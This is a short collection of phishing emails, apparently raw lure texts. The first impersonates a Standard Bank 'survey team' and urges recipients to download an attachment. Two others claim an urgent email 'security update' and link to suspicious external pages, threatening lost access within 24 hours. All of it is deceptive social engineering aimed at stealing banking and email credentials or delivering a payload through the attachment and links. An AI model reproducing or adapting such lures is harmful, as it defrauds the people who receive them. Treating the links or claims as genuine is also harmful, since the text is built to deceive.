Kindly participate in our once off survey to protect you against existing phishing attacks. We receive over a thousand phishing complains from our internet banking customers daily.

This survey will assist us with the necessary measures to counter these attacks.

Respond if one or more of the below options apply to you:

» You have received at least one phishing email asking you to provide your internet banking details;

» You have provided your internet banking details through any form of phishing scheme;

» You have lost money through some sort of phishing attack;

» Your colleague or relative has lost dearly due to the phishing attack;

» You have heard through any media services.

If you meet one of the above, we implore you to download attachment below to get started:

STANDARD BANK SURVEY TEAM

Attention;
There've been an automatic security update on your email address. Click here to complete update <http://www.2iet.com/dump/home.html>
Please note that you have withing 24 hours to complete this update. because you might lose acess to your Email Box.

Attention;
There've been an automatic security update on your email address. CLICK HERE TO UPGRADE<http://accesupgrade201.ucoz.pl/Adminupgrade.htm>
Please note that you have within 24 hours to complete this update. because you might lose access to your Email Account.

